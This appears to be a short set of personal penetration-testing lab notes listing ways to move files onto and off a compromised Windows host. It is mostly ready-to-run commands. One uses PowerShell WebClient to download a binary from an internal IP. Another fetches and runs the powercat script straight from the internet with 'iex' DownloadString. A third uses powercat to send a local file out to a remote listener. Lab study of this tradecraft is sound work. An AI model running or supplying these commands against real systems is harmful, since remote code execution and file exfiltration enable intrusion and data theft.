# File Transfer Techniques on Windows


1. 
```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.119.164/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
```

2. Using wget.exe (not typically installed but if you can get it over using anotehr command first, it'll make your life much easier)
```cmd
wget.exe <url with port included>
```

3. Powershell Download string
```powershell
iex (New-Object
System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/po
wercat/master/powercat.ps1')
```
## Above command is good if computer is internet connected
## As a note, IEX stands for "Invoke Expression"

4. Powercat (I barely use it but this is an option)
```cmd
powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
```
# If you have a listener set up on the remote machine you can use powercat to transfer files to that machine. 
# "-c" means client mode, connect to the ip 10.11.0.4 "-i" indicates the local file that will be transferred to the remote machine. 
